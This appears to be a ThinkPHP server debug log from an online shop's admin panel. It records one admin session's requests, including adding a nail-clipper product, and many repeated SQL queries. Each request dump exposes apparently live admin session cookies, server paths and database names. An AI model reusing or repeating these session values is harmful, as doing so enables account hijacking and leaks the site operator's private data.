+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-05'  AND `webpv` > 0 [ RunTime:0.007044s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-06'  AND `webpv` > 0 [ RunTime:0.006832s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-07'  AND `webpv` > 0 [ RunTime:0.006514s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-08'  AND `webpv` > 0 [ RunTime:0.006509s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-09'  AND `webpv` > 0 [ RunTime:0.006519s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-10'  AND `webpv` > 0 [ RunTime:0.006718s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-11'  AND `webpv` > 0 [ RunTime:0.006502s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-12'  AND `webpv` > 0 [ RunTime:0.006475s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-01' [ RunTime:0.005975s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-02' [ RunTime:0.005955s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-03' [ RunTime:0.006028s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-04' [ RunTime:0.006094s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-05' [ RunTime:0.006134s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-06' [ RunTime:0.005958s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-07' [ RunTime:0.005939s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-08' [ RunTime:0.005988s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-09' [ RunTime:0.006053s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-10' [ RunTime:0.007010s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-11' [ RunTime:0.006019s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-12' [ RunTime:0.009024s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-01' [ RunTime:0.006318s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-02' [ RunTime:0.006497s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-03' [ RunTime:0.006269s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-04' [ RunTime:0.017870s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-05' [ RunTime:0.006343s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-06' [ RunTime:0.017283s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-07' [ RunTime:0.006581s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-08' [ RunTime:0.007338s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-09' [ RunTime:0.006383s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-10' [ RunTime:0.006334s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-11' [ RunTime:0.006358s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-12' [ RunTime:0.006257s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-01' [ RunTime:0.005866s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-02' [ RunTime:0.005905s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-03' [ RunTime:0.006005s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-04' [ RunTime:0.005985s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-05' [ RunTime:0.005939s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-06' [ RunTime:0.005974s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-07' [ RunTime:0.005854s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-08' [ RunTime:0.005987s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-09' [ RunTime:0.005991s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-10' [ RunTime:0.005731s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-11' [ RunTime:0.005672s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-12' [ RunTime:0.005746s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `ucookie` = '1505630090' [ RunTime:0.005850s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `user` [ RunTime:0.001282s ]
+[ sql ] [ SQL ] SELECT * FROM `user` WHERE  `user` = 'admin' [ RunTime:0.000456s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `seo` [ RunTime:0.000921s ]
+[ sql ] [ SQL ] SELECT * FROM `seo` WHERE  `Id` = 1 LIMIT 1 [ RunTime:0.000336s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `webplug` [ RunTime:0.000801s ]
+[ sql ] [ SQL ] SELECT * FROM `webplug` WHERE  `Id` = 1 LIMIT 1 [ RunTime:0.000253s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `danyecon` [ RunTime:0.000723s ]
+[ sql ] [ SQL ] SELECT * FROM `danyecon` [ RunTime:0.000290s ]
+[ sql ] [ SQL ] SELECT * FROM `danyecon` WHERE  `class` = '备忘录' [ RunTime:0.000521s ]
+---------------------------------------------------------------
+[ 2024-06-13T00:08:02+08:00 ] 179.134.4.167 POST aosuper.com/login.php/newsad/newsclass?formname=productc
+[运行时间：0.029947s] [吞吐率：33.39req/s] [内存消耗：2,730.13kb] [文件加载：48]
+[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BIND ] 'admin'
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'newsad',
+    2 => 'newsclass',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'think_usercookie=1505630090; think_username=admin; language=pt; PHPSESSID=932nevgbah75qp9gsejg6tmp73; think_memcookie=890683432; think_user=A',
+  'priority' => 'u=1, i',
+  'accept-language' => 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate, br, zstd',
+  'referer' => 'https://aosuper.com/login.php/admin/loadright?page=upproduct&formname=product',
+  'sec-fetch-dest' => 'empty',
+  'sec-fetch-mode' => 'cors',
+  'sec-fetch-site' => 'same-origin',
+  'origin' => 'https://aosuper.com',
+  'sec-ch-ua-platform' => '"Windows"',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
+  'sec-ch-ua-mobile' => '?0',
+  'x-requested-with' => 'XMLHttpRequest',
+  'accept' => '*/*',
+  'sec-ch-ua' => '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
+  'content-length' => '0',
+  'host' => 'aosuper.com',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+  'formname' => 'productc',
+)
+[ info ] [ RUN ] app\admin\controller\Newsad->newsclass[ /www/wwwroot/tb.youanfutang.cn/application/admin/controller/Newsad.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.001985s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `productc` [ RunTime:0.001161s ]
+[ sql ] [ SQL ] SELECT * FROM `productc` WHERE  `parent_id` = '0' [ RunTime:0.000777s ]
+---------------------------------------------------------------
+[ 2024-06-13T00:08:02+08:00 ] 179.134.4.167 POST aosuper.com/login.php/newsad/newsTree?formname=productc
+[运行时间：0.107540s] [吞吐率：9.30req/s] [内存消耗：3,809.09kb] [文件加载：48]
+[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BIND ] 'admin'
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'newsad',
+    2 => 'newsTree',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'think_usercookie=1505630090; think_username=admin; language=pt; PHPSESSID=932nevgbah75qp9gsejg6tmp73; think_memcookie=890683432; think_user=A',
+  'priority' => 'u=1, i',
+  'accept-language' => 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate, br, zstd',
+  'referer' => 'https://aosuper.com/login.php/admin/loadright?page=upproduct&formname=product',
+  'sec-fetch-dest' => 'empty',
+  'sec-fetch-mode' => 'cors',
+  'sec-fetch-site' => 'same-origin',
+  'origin' => 'https://aosuper.com',
+  'sec-ch-ua-platform' => '"Windows"',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
+  'sec-ch-ua-mobile' => '?0',
+  'x-requested-with' => 'XMLHttpRequest',
+  'accept' => '*/*',
+  'sec-ch-ua' => '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
+  'content-length' => '0',
+  'host' => 'aosuper.com',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+  'formname' => 'productc',
+)
+[ info ] [ RUN ] app\admin\controller\Newsad->newsTree[ /www/wwwroot/tb.youanfutang.cn/application/admin/controller/Newsad.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000717s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `productc` [ RunTime:0.001133s ]
+[ sql ] [ SQL ] SELECT * FROM `productc` [ RunTime:0.001350s ]
+---------------------------------------------------------------
+[ 2024-06-13T00:08:31+08:00 ] 179.134.4.167 POST aosuper.com/login.php/admin/basicicoapi
+[运行时间：0.035982s] [吞吐率：27.79req/s] [内存消耗：2,873.68kb] [文件加载：51]
+[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BIND ] 'admin'
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'admin',
+    2 => 'basicicoapi',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'think_usercookie=1505630090; think_username=admin; language=pt; PHPSESSID=932nevgbah75qp9gsejg6tmp73; think_memcookie=890683432; think_user=A',
+  'priority' => 'u=1, i',
+  'accept-language' => 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate, br, zstd',
+  'referer' => 'https://aosuper.com/login.php/admin/loadright?page=upproduct&formname=product',
+  'sec-fetch-dest' => 'empty',
+  'sec-fetch-mode' => 'cors',
+  'sec-fetch-site' => 'same-origin',
+  'origin' => 'https://aosuper.com',
+  'sec-ch-ua-platform' => '"Windows"',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
+  'sec-ch-ua-mobile' => '?0',
+  'x-requested-with' => 'XMLHttpRequest',
+  'content-type' => 'multipart/form-data; boundary=----WebKitFormBoundaryXcgqoXQOfa5VLWUr',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'sec-ch-ua' => '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
+  'content-length' => '533372',
+  'host' => 'aosuper.com',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\admin\controller\Admin->basicicoapi[ /www/wwwroot/tb.youanfutang.cn/application/admin/controller/Admin.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000685s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `webdata` [ RunTime:0.001076s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `ucookie` = '1505630090' [ RunTime:0.005948s ]
+---------------------------------------------------------------
+[ 2024-06-13T00:08:50+08:00 ] 179.134.4.167 POST aosuper.com/login.php/newsad/upnews?formname=product
+[运行时间：0.029864s] [吞吐率：33.49req/s] [内存消耗：2,712.78kb] [文件加载：48]
+[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BIND ] 'admin'
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'newsad',
+    2 => 'upnews',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'think_usercookie=1505630090; think_username=admin; language=pt; PHPSESSID=932nevgbah75qp9gsejg6tmp73; think_memcookie=890683432; think_user=A',
+  'priority' => 'u=1, i',
+  'accept-language' => 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate, br, zstd',
+  'referer' => 'https://aosuper.com/login.php/admin/loadright?page=upproduct&formname=product',
+  'sec-fetch-dest' => 'empty',
+  'sec-fetch-mode' => 'cors',
+  'sec-fetch-site' => 'same-origin',
+  'origin' => 'https://aosuper.com',
+  'sec-ch-ua-platform' => '"Windows"',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
+  'sec-ch-ua-mobile' => '?0',
+  'x-requested-with' => 'XMLHttpRequest',
+  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'sec-ch-ua' => '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
+  'content-length' => '558',
+  'host' => 'aosuper.com',
+)
+[ info ] [ PARAM ] array (
+  'formname' => 'product',
+  'news_tit' => 'CONJUNTO DE FACAS DE UNHAS',
+  'news_slt' => '/static/upload_img/admin/ico/20240613/5f09619592def88387056fb2fda72271.png',
+  'newsclass' => 'UTENSÍLIOS PARA UNHAS',
+  'newstime' => '',
+  'srcimg' => '[]',
+  'jiage' => '15.00',
+  'yijia' => 'CONJUNTO DE FACAS DE UNHAS',
+  'editor' => '<p>CONJUNTO DE FACAS DE UNHAS</p>',
+  'yanse' => '{}',
+  'xinghao' => 
+  array (
+    0 => '{"0":"CONJUNTO DE FACAS DE UNHAS","1":"15.00"}',
+  ),
+  'ejclass' => 
+  array (
+    0 => 'UTENSÍLIOS PARA UNHAS',
+    1 => 'CONJUNTO DE CORTADOR DE UNHAS',
+  ),
+  'sjclass' => 
+  array (
+    0 => 'UTENSÍLIOS PARA UNHAS',
+    1 => 'CONJUNTO DE CORTADOR DE UNHAS',
+  ),
+)
+[ info ] [ RUN ] app\admin\controller\Newsad->upnews[ /www/wwwroot/tb.youanfutang.cn/application/admin/controller/Newsad.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000828s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `product` [ RunTime:0.001301s ]
+[ sql ] [ SQL ] SELECT * FROM `product` WHERE  `id` = '' [ RunTime:0.000406s ]
+[ sql ] [ SQL ] INSERT INTO `product` (`Id` , `news_tit` , `news_jj` , `news_slt` , `news_editor` , `newsclass` , `srcimg` , `newstime` , `newssort` , `classitem` , `daqu` , `leixing` , `bianhao` , `jiage` , `yijia` , `menpai` , `ifpay` , `xingbie` , `taocan` , `zhlx` , `dengji` , `xinghao` , `yanse` , `ejclass` , `sjclass`) VALUES (0 , 'CONJUNTO DE FACAS DE UNHAS' , '' , '/static/upload_img/admin/ico/20240613/5f09619592def88387056fb2fda72271.png' , '<p>CONJUNTO DE FACAS DE UNHAS</p>' , 'UTENSÍLIOS PARA UNHAS' , '[]' , '2024-06-13' , 0 , '' , '' , '' , '' , '15.00' , 'CONJUNTO DE FACAS DE UNHAS' , '' , '' , '' , '\"\"' , '' , '' , '[\"{\\\"0\\\":\\\"CONJUNTO DE FACAS DE UNHAS\\\",\\\"1\\\":\\\"15.00\\\"}\"]' , '\"{}\"' , '[\"UTENS\\u00cdLIOS PARA UNHAS\",\"CONJUNTO DE CORTADOR DE UNHAS\"]' , '[\"UTENS\\u00cdLIOS PARA UNHAS\",\"CONJUNTO DE CORTADOR DE UNHAS\"]') [ RunTime:0.000523s ]
+---------------------------------------------------------------
+[ 2024-06-13T00:08:53+08:00 ] 179.134.4.167 GET aosuper.com/login.php/admin/loadright?page=product
+[运行时间：0.448835s] [吞吐率：2.23req/s] [内存消耗：3,480.03kb] [文件加载：53]
+[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BIND ] 'admin'
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'admin',
+    2 => 'loadright',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'think_usercookie=1505630090; think_username=admin; language=pt; PHPSESSID=932nevgbah75qp9gsejg6tmp73; think_memcookie=890683432; think_user=A',
+  'priority' => 'u=0, i',
+  'accept-language' => 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate, br, zstd',
+  'referer' => 'https://aosuper.com/login.php/admin/loadright?page=upproduct&formname=product',
+  'sec-fetch-dest' => 'iframe',
+  'sec-fetch-user' => '?1',
+  'sec-fetch-mode' => 'navigate',
+  'sec-fetch-site' => 'same-origin',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
+  'upgrade-insecure-requests' => '1',
+  'sec-ch-ua-platform' => '"Windows"',
+  'sec-ch-ua-mobile' => '?0',
+  'sec-ch-ua' => '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
+  'host' => 'aosuper.com',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+  'page' => 'product',
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\admin\controller\Admin->loadright[ /www/wwwroot/tb.youanfutang.cn/application/admin/controller/Admin.php ]
+[ info ] [ VIEW ] /www/wwwroot/tb.youanfutang.cn/public/../application/admin/view/admin/table/product.html [ array (
+  0 => 'languageObj',
+  1 => 'language',
+  2 => 'userid',
+  3 => 'user',
+  4 => 'password',
+  5 => 'ico',
+  6 => 'username',
+  7 => 'companyname',
+  8 => 'webname',
+  9 => 'domain',
+  10 => 'Address',
+  11 => 'person',
+  12 => 'mobile',
+  13 => 'qq',
+  14 => 'Introduction',
+  15 => 'tippw',
+  16 => 'weblogo',
+  17 => 'seowebname',
+  18 => 'seowebdomain',
+  19 => 'seoseotitle',
+  20 => 'seoseokey',
+  21 => 'seoseodsc',
+  22 => 'seoseoheader',
+  23 => 'jstwo',
+  24 => 'jsone',
+  25 => 'url',
+  26 => 'danyecon',
+  27 => 'num',
+  28 => 'webdomain',
+  29 => 'appid',
+  30 => 'miyao',
+  31 => 'fxtit',
+  32 => 'fxms',
+  33 => 'wxtit',
+  34 => 'Hamtime',
+  35 => 'photo',
+  36 => 'wxms',
+  37 => 'photowx',
+  38 => 'viewUV',
+  39 => 'loginnum',
+  40 => 'alluv',
+  41 => 'allmb',
+  42 => 'allorder',
+  43 => 'allkc',
+  44 => 'acviewnum',
+  45 => 'pdviewnum',
+  46 => 'notes',
+  47 => 'productc',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000687s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `webdata` [ RunTime:0.001085s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `ucookie` = '1505630090' [ RunTime:0.005954s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `language` [ RunTime:0.001152s ]
+[ sql ] [ SQL ] SELECT * FROM `language` ORDER BY `create_at` DESC [ RunTime:0.001443s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `webpv` > 0 ORDER BY `Id` DESC [ RunTime:0.047326s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `member` [ RunTime:0.003319s ]
+[ sql ] [ SQL ] SELECT * FROM `member` ORDER BY `Id` DESC [ RunTime:0.000491s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `order` [ RunTime:0.000867s ]
+[ sql ] [ SQL ] SELECT * FROM `order` ORDER BY `Id` DESC [ RunTime:0.004395s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `news` [ RunTime:0.001442s ]
+[ sql ] [ SQL ] SELECT * FROM `news` ORDER BY `Id` DESC [ RunTime:0.000392s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-01'  AND `webpv` > 0 [ RunTime:0.006880s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-02'  AND `webpv` > 0 [ RunTime:0.006836s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-03'  AND `webpv` > 0 [ RunTime:0.006729s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-04'  AND `webpv` > 0 [ RunTime:0.006677s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-05'  AND `webpv` > 0 [ RunTime:0.006739s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-06'  AND `webpv` > 0 [ RunTime:0.007020s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-07'  AND `webpv` > 0 [ RunTime:0.006755s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-08'  AND `webpv` > 0 [ RunTime:0.006500s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-09'  AND `webpv` > 0 [ RunTime:0.006430s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-10'  AND `webpv` > 0 [ RunTime:0.006797s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-11'  AND `webpv` > 0 [ RunTime:0.006651s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-12'  AND `webpv` > 0 [ RunTime:0.006475s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-01' [ RunTime:0.005874s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-02' [ RunTime:0.005893s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-03' [ RunTime:0.005829s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-04' [ RunTime:0.005912s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-05' [ RunTime:0.006022s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-06' [ RunTime:0.005891s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-07' [ RunTime:0.005831s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-08' [ RunTime:0.005848s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-09' [ RunTime:0.005972s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-10' [ RunTime:0.005851s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-11' [ RunTime:0.005775s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-12' [ RunTime:0.005922s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-01' [ RunTime:0.006295s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-02' [ RunTime:0.006382s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-03' [ RunTime:0.006452s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-04' [ RunTime:0.006556s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-05' [ RunTime:0.006421s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-06' [ RunTime:0.006200s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-07' [ RunTime:0.006042s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-08' [ RunTime:0.006168s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-09' [ RunTime:0.006199s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-10' [ RunTime:0.006037s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-11' [ RunTime:0.006057s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-12' [ RunTime:0.005966s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-01' [ RunTime:0.005552s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-02' [ RunTime:0.005662s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-03' [ RunTime:0.005692s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-04' [ RunTime:0.005621s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-05' [ RunTime:0.005688s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-06' [ RunTime:0.005866s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-07' [ RunTime:0.005605s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-08' [ RunTime:0.005643s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-09' [ RunTime:0.005615s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-10' [ RunTime:0.005803s ]
